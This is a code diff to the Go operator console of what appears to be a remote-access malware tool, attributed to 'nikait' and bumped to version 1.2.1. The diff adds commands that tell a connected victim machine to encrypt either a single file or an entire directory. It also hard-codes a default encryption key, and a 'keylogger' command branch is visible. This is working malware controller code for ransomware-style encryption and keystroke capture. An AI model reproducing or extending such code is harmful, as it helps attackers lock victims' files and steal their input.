@@ -160,25 +160,53 @@ func main() {
 		}
 
 		if message == "crypt" {
+			var cry string
 			buffer = make([]byte, 1024)
-			Magenta.Print("enter the full path to the file => ")
-			fmt.Fscan(os.Stdin, &directory)
-			Magenta.Println("create a password")
-			Magenta.Println("password length should be 32 characters")
-			Magenta.Println("by default the password will be like this:")
-			Magenta.Println("7d*9ek<3j&78bs3&#8h3ox7g39@83jz9")
-			Magenta.Print("=> ")
-			fmt.Fscan(os.Stdin, &password)
-			if len(password) != 32 {
-				password = "7d*9ek<3j&78bs3&#8h3ox7g39@83jz9"
+			Magenta.Print("You want to encrypt ?:\n1 - one file\n2 - the entire directory\n=> ")
+			fmt.Fscan(os.Stdin, &cry)
+			if cry == "1" {
+				Magenta.Print("enter the full path to the file => ")
+				fmt.Fscan(os.Stdin, &directory)
+				Magenta.Println("create a password")
+				Magenta.Println("password length should be 32 characters")
+				Magenta.Println("by default the password will be like this:")
+				Magenta.Println("7d*9ek<3j&78bs3&#8h3ox7g39@83jz9")
+				Magenta.Print("=> ")
+				fmt.Fscan(os.Stdin, &password)
+				if len(password) != 32 {
+					password = "7d*9ek<3j&78bs3&#8h3ox7g39@83jz9"
+				}
+				if strings.HasSuffix(directory, "/") {
+					directory = directory[:len(directory)-1]
+				}
+				local := "crypt " + password + " " + directory
+				conn.Write([]byte(local))
+				conn.Read(buffer)
+				fmt.Println(string(buffer))
 			}
-			if strings.HasSuffix(directory, "/") {
-				directory = directory[:len(directory)-1]
+			if cry == "2" {
+				Magenta.Print("enter the full path to the directory => ")
+				fmt.Fscan(os.Stdin, &directory)
+				Magenta.Println("create a password")
+				Magenta.Println("password length should be 32 characters")
+				Magenta.Println("by default the password will be like this:")
+				Magenta.Println("7d*9ek<3j&78bs3&#8h3ox7g39@83jz9")
+				Magenta.Print("=> ")
+				fmt.Fscan(os.Stdin, &password)
+				if len(password) != 32 {
+					password = "7d*9ek<3j&78bs3&#8h3ox7g39@83jz9"
+				}
+				if strings.HasSuffix(directory, "/") {
+					directory = directory[:len(directory)-1]
+				}
+				local := "dircrypt " + password + " " + directory
+				conn.Write([]byte(local))
+				conn.Read(buffer)
+				profits := strings.Split(string(buffer), "\n")
+				for _, value := range profits {
+					fmt.Println(value)
+				}
 			}
-			local := "crypt " + password + " " + directory
-			conn.Write([]byte(local))
-			conn.Read(buffer)
-			fmt.Println(string(buffer))
 		}
 
 		if message == "keylogger" {
@@ -295,8 +323,8 @@ func logo() {
 	Magenta.Println("	|    /| |-||  | |")
 	Blue.Print("\\____/  \\____/")
 	Magenta.Println("	\\_/\\_\\\\_/ \\|  \\_/")
-	Green.Print("\t\t\t     v ")
-	Red.Println("1.2")
+	Green.Print("\t\t\t   v ")
+	Red.Println("1.2.1")
 	fmt.Print("coded by")
 	Green.Print(" >> ")
 	Magenta.Println("nikait")
